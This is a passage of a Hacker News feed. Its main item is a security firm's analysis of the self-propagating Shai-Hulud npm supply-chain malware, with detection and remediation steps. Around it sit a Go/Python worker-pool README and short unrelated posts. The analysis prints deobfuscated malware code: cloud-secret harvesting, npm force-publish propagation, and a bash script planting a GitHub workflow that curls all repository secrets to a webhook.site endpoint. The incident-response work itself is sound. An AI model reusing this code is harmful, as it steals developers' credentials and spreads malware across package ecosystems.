    &lt;p&gt;Example results on M1 MacBook Pro:&lt;/p&gt;
    &lt;code&gt;BenchmarkPool/workers=1-10         10    235µs/op     4255 req/s
BenchmarkPool/workers=2-10         10    124µs/op     8065 req/s  
BenchmarkPool/workers=4-10         10     68µs/op    14706 req/s
BenchmarkPool/workers=8-10         10     45µs/op    22222 req/s

BenchmarkPoolParallel/workers=2-10   100    18µs/op    55556 req/s
BenchmarkPoolParallel/workers=4-10   100     9µs/op   111111 req/s
BenchmarkPoolParallel/workers=8-10   100     5µs/op   200000 req/s

BenchmarkPoolLatency-10            100   p50: 45µs  p95: 89µs  p99: 125µs
&lt;/code&gt;
    &lt;p&gt;The benchmarks show near-linear scaling with worker count, demonstrating the effectiveness of bypassing Python's GIL through process-based parallelism.&lt;/p&gt;
    &lt;code&gt;pool, _ := pyproc.NewPool(pyproc.PoolOptions{
    Config: pyproc.PoolConfig{
        Workers:     4,
        MaxInFlight: 10,
    },
    WorkerConfig: pyproc.WorkerConfig{
        SocketPath:   "/tmp/pyproc.sock",
        PythonExec:   "python3",
        WorkerScript: "worker.py",
    },
}, nil)

ctx := context.Background()
pool.Start(ctx)
defer pool.Shutdown(ctx)

var result map[string]interface{}
pool.Call(ctx, "predict", input, &amp;amp;result)&lt;/code&gt;
    &lt;code&gt;pool, _ := pyproc.NewPool(ctx, pyproc.PoolOptions{
    Protocol: pyproc.ProtocolGRPC(),
    // Unix domain socket with gRPC
})&lt;/code&gt;
    &lt;code&gt;pool, _ := pyproc.NewPool(ctx, pyproc.PoolOptions{
    Protocol: pyproc.ProtocolArrow(),
    // Zero-copy data transfer
})&lt;/code&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Metric&lt;/cell&gt;
        &lt;cell role="head"&gt;Target&lt;/cell&gt;
        &lt;cell role="head"&gt;Notes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Latency (p50)&lt;/cell&gt;
        &lt;cell&gt;&amp;lt; 100μs&lt;/cell&gt;
        &lt;cell&gt;Simple function calls&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Latency (p99)&lt;/cell&gt;
        &lt;cell&gt;&amp;lt; 500μs&lt;/cell&gt;
        &lt;cell&gt;Including GC and process overhead&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Throughput&lt;/cell&gt;
        &lt;cell&gt;1-5k RPS&lt;/cell&gt;
        &lt;cell&gt;Per service instance&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Payload Size&lt;/cell&gt;
        &lt;cell&gt;&amp;lt; 100KB&lt;/cell&gt;
        &lt;cell&gt;JSON request/response&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Worker Count&lt;/cell&gt;
        &lt;cell&gt;2-8 per CPU core&lt;/cell&gt;
        &lt;cell&gt;Based on workload type&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Required Metrics:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Request latency (p50, p95, p99)&lt;/item&gt;
      &lt;item&gt;Request rate and error rate&lt;/item&gt;
      &lt;item&gt;Worker health status&lt;/item&gt;
      &lt;item&gt;Connection pool utilization&lt;/item&gt;
      &lt;item&gt;Python process memory usage&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Health Check Endpoints:&lt;/p&gt;
    &lt;code&gt;// Built-in health check
health := pool.Health()
if health.HealthyWorkers &amp;lt; health.TotalWorkers/2 {
    log.Warn("majority of workers unhealthy")
}&lt;/code&gt;
    &lt;p&gt;Alerting Thresholds:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Worker failure rate &amp;gt; 5%&lt;/item&gt;
      &lt;item&gt;p99 latency &amp;gt; 1s&lt;/item&gt;
      &lt;item&gt;Memory growth &amp;gt; 500MB/hour&lt;/item&gt;
      &lt;item&gt;Connection pool exhaustion&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Resource Limits:&lt;/p&gt;
    &lt;code&gt;resources:
  requests:
    memory: "256Mi"
    cpu: "200m"
  limits:
    memory: "1Gi" 
    cpu: "1000m"&lt;/code&gt;
    &lt;p&gt;Restart Policies:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Python worker restart on OOM or crash&lt;/item&gt;
      &lt;item&gt;Exponential backoff for failed restarts&lt;/item&gt;
      &lt;item&gt;Maximum 3 restart attempts per minute&lt;/item&gt;
      &lt;item&gt;Circuit breaker after 10 consecutive failures&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Socket Management:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use &lt;code&gt;/tmp/sockets/&lt;/code&gt;or shared volume in K8s&lt;/item&gt;
      &lt;item&gt;Set socket permissions 0660&lt;/item&gt;
      &lt;item&gt;Clean up sockets on graceful shutdown&lt;/item&gt;
      &lt;item&gt;Monitor socket file descriptors&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set appropriate worker count based on CPU cores&lt;/item&gt;
      &lt;item&gt;Configure health checks and alerting&lt;/item&gt;
      &lt;item&gt; Set up monitoring (metrics exposed at &lt;code&gt;:9090/metrics&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Configure restart policies and circuit breakers&lt;/item&gt;
      &lt;item&gt;Set resource limits (memory, CPU)&lt;/item&gt;
      &lt;item&gt;Handle worker failures gracefully&lt;/item&gt;
      &lt;item&gt;Test failover scenarios&lt;/item&gt;
      &lt;item&gt;Configure socket permissions and cleanup&lt;/item&gt;
      &lt;item&gt;Set up log aggregation for Python workers&lt;/item&gt;
      &lt;item&gt;Document runbook for common issues&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We welcome contributions! Check out our "help wanted" issues to get started.&lt;/p&gt;
    &lt;p&gt;Apache 2.0 - See LICENSE for details.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/YuminosukeSato/pyproc"/><published>2025-09-16T04:08:00+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45260741</id><title>Self Propagating NPM Malware Compromises over 40 Packages</title><updated>2025-09-16T13:01:40.693418+00:00</updated><content>&lt;doc fingerprint="8c2364128c168402"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Executive Summary&lt;/head&gt;
    &lt;p&gt;The NPM ecosystem is facing another critical supply chain attack. The popular @ctrl/tinycolor package, which receives over 2 million weekly downloads, has been compromised along with more than 40 other packages across multiple maintainers. This attack demonstrates a concerning evolution in supply chain threats - the malware includes a self-propagating mechanism that automatically infects downstream packages, creating a cascading compromise across the ecosystem. The compromised versions have been removed from npm.&lt;/p&gt;
    &lt;p&gt;The incident was discovered by @franky47, who promptly notified the community through a GitHub issue.&lt;/p&gt;
    &lt;p&gt;In this post, we'll dive deep into the payload's mechanics, including deobfuscated code snippets, API call traces, and diagrams to illustrate the attack chain. Our analysis reveals a Webpack-bundled script (bundle.js) that leverages Node.js modules for reconnaissance, harvesting, and propagation; targeting Linux/macOS devs with access to NPM/GitHub/cloud creds.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Analysis&lt;/head&gt;
    &lt;p&gt;The attack unfolds through a sophisticated multi-stage chain that leverages Node.js's process.env for opportunistic credential access and employs Webpack-bundled modules for modularity. At the core of this attack is a ~3.6MB minified bundle.js file, which executes asynchronously during npm install. This execution is likely triggered via a hijacked postinstall script embedded in the compromised package.json.&lt;/p&gt;
    &lt;p&gt;Self-Propagation Engineâ&lt;/p&gt;
    &lt;p&gt;The malware includes a self-propagation mechanism through the NpmModule.updatePackage function. This function queries the NPM registry API to fetch up to 20 packages owned by the maintainer, then force-publishes patches to these packages. This creates a cascading compromise effect, recursively injecting the malicious bundle into dependent ecosystems across the NPM registry.&lt;/p&gt;
    &lt;p&gt;Credential Harvestingâ&lt;/p&gt;
    &lt;p&gt;The malware repurposes open-source tools like TruffleHog to scan the filesystem for high-entropy secrets. It searches for patterns such as AWS keys using regular expressions like AKIA[0-9A-Z]{16}. Additionally, the malware dumps the entire process.env, capturing transient tokens such as GITHUB_TOKEN and AWS_ACCESS_KEY_ID.&lt;/p&gt;
    &lt;p&gt;For cloud-specific operations, the malware enumerates AWS Secrets Manager using SDK pagination and accesses Google Cloud Platform secrets via the @google-cloud/secret-manager API. The malware specifically targets the following credentials:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;AWS access keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)&lt;/item&gt;
      &lt;item&gt;Google Cloud Platform service credentials&lt;/item&gt;
      &lt;item&gt;Azure credentials&lt;/item&gt;
      &lt;item&gt;Cloud metadata endpoints&lt;/item&gt;
      &lt;item&gt;NPM authentication tokens&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Persistence Mechanismâ&lt;/p&gt;
    &lt;p&gt;The malware establishes persistence by injecting a GitHub Actions workflow file (.github/workflows/shai-hulud-workflow.yml) via a base64-encoded bash script. This workflow triggers on push events and exfiltrates repository secrets using the expression ${{ toJSON(secrets) }} to a command and control endpoint. The malware creates branches by force-merging from the default branch (refs/heads/shai-hulud) using GitHub's /git/refs endpoint.&lt;/p&gt;
    &lt;p&gt;Data Exfiltrationâ&lt;/p&gt;
    &lt;p&gt;The malware aggregates harvested credentials into a JSON payload, which is pretty-printed for readability. It then uploads this data to a new public repository named &lt;code&gt;Shai-Hulud&lt;/code&gt; via the GitHub /user/repos API.&lt;/p&gt;
    &lt;p&gt;The entire attack design assumes Linux or macOS execution environments, checking for os.platform() === 'linux' || 'darwin'. It deliberately skips Windows systems. For a visual breakdown, see the attack flow diagram below:&lt;/p&gt;
    &lt;head rend="h2"&gt;Attack Mechanism&lt;/head&gt;
    &lt;p&gt;The compromise begins with a sophisticated minified JavaScript bundle injected into affected packages like @ctrl/tinycolor. This is not rudimentary malware but rather a sophisticated modular engine that uses Webpack chunks to organize OS utilities, cloud SDKs, and API wrappers.&lt;/p&gt;
    &lt;p&gt;The payload imports six core modules, each serving a specific function in the attack chain.&lt;/p&gt;
    &lt;head rend="h3"&gt;OS Recon (Module 71197)&lt;/head&gt;
    &lt;p&gt;This module calls getSystemInfo() to build a comprehensive system profile containing platform, architecture, platformRaw, and archRaw information. It dumps the entire process.env, capturing sensitive environment variables including AWS_ACCESS_KEY_ID, GITHUB_TOKEN, and other credentials that may be present in the environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Credential Harvesting Across Clouds&lt;/head&gt;
    &lt;head rend="h4"&gt;AWS (Module 56686)&lt;/head&gt;
    &lt;p&gt;The AWS harvesting module validates credentials using the STS AssumeRoleWithWebIdentityCommand. It then enumerates secrets using the @aws-sdk/client-secrets-manager library.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated AWS harvest snippet
async getAllSecretValues() {
  const secrets = [];
  let nextToken;
  do {
    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
    for (const secret of resp.SecretList || []) {
      const value = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
      secrets.push({ ARN: secret.ARN, SecretString: value.SecretString, SecretBinary: atob(value.SecretBinary) });  // Base64 decode binaries
    }
    nextToken = resp.NextToken;
  } while (nextToken);
  return secrets;
}&lt;/code&gt;
    &lt;p&gt;The module handles errors such as DecryptionFailure or ResourceNotFoundException silently through decorateServiceException wrappers. It targets all AWS regions via endpoint resolution.&lt;/p&gt;
    &lt;head rend="h4"&gt;GCP (Module 9897)â&lt;/head&gt;
    &lt;p&gt;The GCP module uses @google-cloud/secret-manager to list secrets matching the pattern projects//secrets/. It implements pagination using nextPageToken and returns objects containing the secret name and decoded payload. The module fails silently on PERMISSION_DENIED errors without alerting the user.&lt;/p&gt;
    &lt;head rend="h4"&gt;Filesystem Secret Scanning (Module 94913)&lt;/head&gt;
    &lt;p&gt;This module spawns TruffleHog via child_process.exec('trufflehog filesystem / --json') to scan the entire filesystem. It parses the output for high-entropy matches, such as AWS keys found in ~/.aws/credentials.&lt;/p&gt;
    &lt;head rend="h3"&gt;Propagation Mechanics&lt;/head&gt;
    &lt;head rend="h4"&gt;NPM Pivot (Module 40766)&lt;/head&gt;
    &lt;p&gt;The NPM propagation module parses NPM_TOKEN from either ~/.npmrc or environment variables. After validating the token via the /whoami endpoint, it queries /v1/search?text=maintainer:${username}&amp;amp;size=20 to retrieve packages owned by the maintainer.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated NPM update snippet
async updatePackage(pkg) {
  // Patch package.json (add self as dep?) and publish
  await exec(`npm version patch --force &amp;amp;&amp;amp; npm publish --access public --token ${token}`);
}&lt;/code&gt;
    &lt;p&gt;This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user.&lt;/p&gt;
    &lt;head rend="h4"&gt;GitHub Backdoor (Module 82036)â&lt;/head&gt;
    &lt;p&gt;The GitHub backdoor module authenticates via the /user endpoint, requiring repo and workflow scopes. After listing organizations, it injects malicious code via a bash script (Module 941).&lt;/p&gt;
    &lt;p&gt;Here is the line-by-line bash script deconstruction:&lt;/p&gt;
    &lt;code&gt;# Deobfuscated Code snippet
#!/bin/bash
GITHUB_TOKEN="$1"
BRANCH_NAME="shai-hulud"
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

FILE_CONTENT=$(cat &amp;lt;&amp;lt;'EOF'
on: push  # Trigger on any push
jobs: process
  runs-on: ubuntu-latest
  steps:
  - run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7;  # C2 exfil
         echo "$CONTENTS" | base64 -w 0 | base64 -w 0  # Double-base64 for evasion
    env: CONTENTS: ${{ toJSON(secrets) }}  # Dumps all repo secrets (GITHUB_TOKEN, AWS keys, etc.)
EOF
)

github_api() { curl -s -X "$1" -H "Authorization: token $GITHUB_TOKEN" ... "$API_BASE$2" }

REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&amp;amp;since=2025-01-01T00:00:00Z&amp;amp;per_page=100")

while IFS= read -r repo; do
  # Get default branch SHA
  REF_RESPONSE=$(github_api GET "/repos/$REPO_FULL_NAME/git/ref/heads/$DEFAULT_BRANCH")
  BASE_SHA=$(jq -r '.object.sha' &amp;lt;&amp;lt;&amp;lt; "$REF_RESPONSE")

  BRANCH_DATA=$(jq -n '{ref: "refs/heads/shai-hulud", sha: "$BASE_SHA"}')
  github_api POST "/repos/$REPO_FULL_NAME/git/refs" "$BRANCH_DATA"  # Handles "already exists" gracefully

  FILE_DATA=$(jq -n '{message: "Add workflow", content: "$(base64 &amp;lt;&amp;lt;&amp;lt; "$FILE_CONTENT")", branch: "shai-hulud"}')
  github_api PUT "/repos/$REPO_FULL_NAME/contents/$FILE_NAME" "$FILE_DATA"  # Overwrites if exists
done&lt;/code&gt;
    &lt;p&gt;This mechanism ensures persistence, as secrets are exfiltrated to the command and control server on the next push event.&lt;/p&gt;
    &lt;head rend="h3"&gt;Exfiltrationâ&lt;/head&gt;
    &lt;p&gt;The malware builds a comprehensive JSON payload containing system information, environment variables, and data from all modules. It then creates a public repository via the GitHub /repos POST endpoint using the function &lt;code&gt;makeRepo('Shai-Hulud')&lt;/code&gt;. The repository is public by default to ensure easy access for the command and control infrastructure.&lt;/p&gt;
    &lt;p&gt;The attack employs several evasion techniques including silent error handling (swallowed via catch {} blocks), no logging output, and disguising TruffleHog execution as a legitimate "security scan."&lt;/p&gt;
    &lt;head rend="h2"&gt;Indicators of Compromise&lt;/head&gt;
    &lt;p&gt;The following indicators can help identify systems affected by this attack:&lt;/p&gt;
    &lt;head rend="h3"&gt;GitHub Search Queries for Detection&lt;/head&gt;
    &lt;p&gt;Use these GitHub search queries to identify potentially compromised repositories across your organization:&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious workflow file&lt;/head&gt;
    &lt;p&gt;Replace &lt;code&gt;ACME&lt;/code&gt; with your GitHub organization name and use the following GitHub search query to discover all instance of &lt;code&gt;shai-hulud-workflow.yml&lt;/code&gt; in your GitHub environment.&lt;/p&gt;
    &lt;p&gt;https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&amp;amp;type=code&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious branch&lt;/head&gt;
    &lt;p&gt;To find malicious branches, you can use the following Bash script:&lt;/p&gt;
    &lt;code&gt;# List all repos and check for shai-hulud branch
gh repo list YOUR_ORG_NAME --limit 1000 --json nameWithOwner --jq '.[].nameWithOwner' | while read repo; do
  gh api "repos/$repo/branches" --jq '.[] | select(.name == "shai-hulud") | "'$repo' has branch: " + .name'
done&lt;/code&gt;
    &lt;head rend="h3"&gt;File Hashes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The malicious bundle.js file has a SHA-256 hash of: &lt;code&gt;46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exfiltration endpoint: &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;File System Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Presence of malicious workflow file: &lt;code&gt;.github/workflows/shai-hulud-workflow.yml&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Function Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Calls to &lt;code&gt;NpmModule.updatePackage&lt;/code&gt;function&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious API Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AWS API calls to &lt;code&gt;secretsmanager.*.amazonaws.com&lt;/code&gt;endpoints, particularly&lt;code&gt;BatchGetSecretValueCommand&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GCP API calls to &lt;code&gt;secretmanager.googleapis.com&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM registry queries to &lt;code&gt;registry.npmjs.org/v1/search&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GitHub API calls to &lt;code&gt;api.github.com/repos&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Process Executions&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TruffleHog execution with arguments &lt;code&gt;filesystem /&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM publish commands with &lt;code&gt;--force&lt;/code&gt;flag&lt;/item&gt;
      &lt;item&gt;Curl commands targeting webhook.site domains&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Affected Packages&lt;/head&gt;
    &lt;p&gt;The following packages have been confirmed as compromised:&lt;/p&gt;
    &lt;head rend="h2"&gt;Immediate Actions Required&lt;/head&gt;
    &lt;p&gt;If you use any of the affected packages, take these actions immediately:&lt;/p&gt;
    &lt;head rend="h3"&gt;Identify and Remove Compromised Packages&lt;/head&gt;
    &lt;code&gt;# Check for affected packages in your project
npm ls @ctrl/tinycolor

# Remove compromised packages
npm uninstall @ctrl/tinycolor

# Search for the known malicious bundle.js by hash
find . -type f -name "*.js" -exec sha256sum {} \; | grep "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Clean Infected Repositories&lt;/head&gt;
    &lt;head rend="h4"&gt;Remove Malicious GitHub Actions Workflow&lt;/head&gt;
    &lt;code&gt;# Check for and remove the backdoor workflow
rm -f .github/workflows/shai-hulud-workflow.yml

# Look for suspicious 'shai-hulud' branches in all repositories
git ls-remote --heads origin | grep shai-hulud

# Delete any malicious branches found
git push origin --delete shai-hulud&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Rotate All Credentials Immediately&lt;/head&gt;
    &lt;p&gt;The malware harvests credentials from multiple sources. Rotate ALL of the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;NPM tokens (automation and publish tokens)&lt;/item&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;GitHub Actions secrets in all repositories&lt;/item&gt;
      &lt;item&gt;SSH keys used for Git operations&lt;/item&gt;
      &lt;item&gt;AWS IAM credentials, access keys, and session tokens&lt;/item&gt;
      &lt;item&gt;Google Cloud service account keys and OAuth tokens&lt;/item&gt;
      &lt;item&gt;Azure service principals and access tokens&lt;/item&gt;
      &lt;item&gt;Any credentials stored in AWS Secrets Manager or GCP Secret Manager&lt;/item&gt;
      &lt;item&gt;API keys found in environment variables&lt;/item&gt;
      &lt;item&gt;Database connection strings&lt;/item&gt;
      &lt;item&gt;Third-party service tokens&lt;/item&gt;
      &lt;item&gt;CI/CD pipeline secrets&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Audit Cloud Infrastructure for Compromise&lt;/head&gt;
    &lt;p&gt;Since the malware specifically targets AWS Secrets Manager and GCP Secret Manager, you need to audit your cloud infrastructure for unauthorized access. The malware uses API calls to enumerate and exfiltrate secrets, so reviewing audit logs is critical to understanding the scope of compromise.&lt;/p&gt;
    &lt;head rend="h4"&gt;AWS Security Audit&lt;/head&gt;
    &lt;p&gt;Start by examining your CloudTrail logs for any suspicious secret access patterns. Look specifically for BatchGetSecretValue, ListSecrets, and GetSecretValue API calls that occurred during the time window when the compromised package may have been installed. Also generate and review IAM credential reports to identify any unusual authentication patterns or newly created access keys.&lt;/p&gt;
    &lt;code&gt;# Check CloudTrail for suspicious secret access
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchGetSecretValue
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListSecrets
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue

# Review IAM credential reports for unusual activity
aws iam get-credential-report --query 'Content'&lt;/code&gt;
    &lt;head rend="h4"&gt;GCP Security Audit&lt;/head&gt;
    &lt;p&gt;For Google Cloud Platform, review your audit logs for any access to the Secret Manager service. The malware uses the @google-cloud/secret-manager library to enumerate secrets, so look for unusual patterns of secret access. Additionally, check for any unauthorized service account key creation, as these could be used for persistent access.&lt;/p&gt;
    &lt;code&gt;# Review secret manager access logs
gcloud logging read "resource.type=secretmanager.googleapis.com" --limit=50 --format=json

# Check for unauthorized service account key creation
gcloud logging read "protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey"&lt;/code&gt;
    &lt;head rend="h3"&gt;Monitor for Active Exploitation&lt;/head&gt;
    &lt;head rend="h4"&gt;Network Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Block outbound connections to &lt;code&gt;webhook.site&lt;/code&gt;domains immediately&lt;/item&gt;
      &lt;item&gt;Monitor firewall logs for connections to &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Implement Security Controls&lt;/head&gt;
    &lt;head rend="h4"&gt;GitHub Security Hardening&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Review and remove unnecessary GitHub Apps and OAuth applications&lt;/item&gt;
      &lt;item&gt;Audit all repository webhooks for unauthorized additions&lt;/item&gt;
      &lt;item&gt;Check deploy keys and repository secrets for all projects&lt;/item&gt;
      &lt;item&gt;Enable branch protection rules to prevent force-pushes&lt;/item&gt;
      &lt;item&gt;Turn on GitHub Secret Scanning alerts&lt;/item&gt;
      &lt;item&gt;Enable Dependabot security updates&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Ongoing Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up alerts for any new npm publishes from your organization&lt;/item&gt;
      &lt;item&gt;Monitor CloudTrail/GCP audit logs for secret access patterns&lt;/item&gt;
      &lt;item&gt;Implement regular credential rotation policies&lt;/item&gt;
      &lt;item&gt;Use separate, limited-scope tokens for CI/CD pipelines&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;For StepSecurity Enterprise Customers&lt;/head&gt;
    &lt;p&gt;The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing the StepSecurity GitHub App to complete the following recovery step.&lt;/p&gt;
    &lt;head rend="h4"&gt;â&lt;lb/&gt;Use NPM Package Cooldown Check&lt;/head&gt;
    &lt;p&gt;The NPMÂ Cooldown check automatically fails a pull request if it introduces an npm package version that was released within the organizationâs configured cooldown period (default: 2 days). Once the cooldown period has passed, the check will clear automatically with no action required. The rationale is simple - most supply chain attacks are detected within the first 24 hours of a malicious package release, and the projects that get compromised are often the ones that rushed to adopt the version immediately. By introducing a short waiting period before allowing new dependencies, teams can reduce their exposure to fresh attacks while still keeping their dependencies up to date.&lt;lb/&gt;Here is an example showing how this check protected a project from using the compromised versions of packages involved in this incident:&lt;/p&gt;
    &lt;p&gt;https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488&lt;/p&gt;
    &lt;head rend="h4"&gt;Discover Pull Requests upgrading to compromised npm packages&lt;/head&gt;
    &lt;p&gt;We have added a new control specifically to detect pull requests that upgraded to these compromised packages. You can find the new control on the StepSecurity dashboard.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Harden-Runner to detect compromised dependencies in CI/CD&lt;/head&gt;
    &lt;p&gt;StepSecurity Harden-Runner adds runtime security monitoring to your GitHub Actions workflows, providing visibility into network calls, file system changes, and process executions during CI/CD runs. Harden-Runner detects the compromised nx packages when they are used in CI/CD. Here is a sample Harden-Runner insights page demonstrating this detection:&lt;/p&gt;
    &lt;p&gt;If you're already using Harden-Runner, we strongly recommend you review recent anomaly detections in your Harden-Runner dashboard. You can get started with Harden-Runner by following the guide at https://docs.stepsecurity.io/harden-runner.&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Artifact Monitor to detect software releases outside of authorized pipelines&lt;/head&gt;
    &lt;p&gt;StepSecurity Artifact Monitor provides real-time detection of unauthorized package releases by continuously monitoring your artifacts across package registries. This tool would have flagged this incident by detecting that the compromised versions were published outside of the project's authorized CI/CD pipeline. The monitor tracks release patterns, verifies provenance, and alerts teams when packages are published through unusual channels or from unexpected locations. By implementing Artifact Monitor, organizations can catch supply chain compromises within minutes rather than hours or days, significantly reducing the window of exposure to malicious packages.&lt;/p&gt;
    &lt;p&gt;Learn more about implementing Artifact Monitor in your security workflow at https://docs.stepsecurity.io/artifact-monitor.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reference&lt;/head&gt;
    &lt;p&gt;â&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised"/><published>2025-09-16T11:22:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45260969</id><title>Ask HN: Generalists, when do you say "I know enough" about any particular topic?</title><updated>2025-09-16T13:01:40.419728+00:00</updated><content>&lt;doc fingerprint="2795d1b42a676617"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;The idea is generalists know a lot about everything and when to pass it off to a subject matter expert.&lt;/p&gt;
      &lt;p&gt;In 2025, with everything in tech changing by the minute, I’m realizing I need to set boundaries about how deep I go on any particular topic. But I’m unsure how. Particularly if I don’t want to get left behind as things continue to evolve.&lt;/p&gt;
      &lt;p&gt;Curious how other folks approach this?&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=45260969"/><published>2025-09-16T11:51:18+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261159</id><title>Robert Redford Has Died</title><updated>2025-09-16T13:01:40.190775+00:00</updated><content/><link href="https://www.nytimes.com/2025/09/16/movies/robert-redford-dead.html"/><published>2025-09-16T12:10:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45261163</id><title>FBI couldn't get my husband to decrypt his Tor node so he was jailed for 3 years</title><updated>2025-09-16T13:01:40.066318+00:00</updated><content/><link href="https://old.reddit.com/r/TOR/comments/1ni5drm/the_fbi_couldnt_get_my_husband_to_decrypt_his_tor/"/><published>2025-09-16T12:10:49+00:00</published></entry></feed>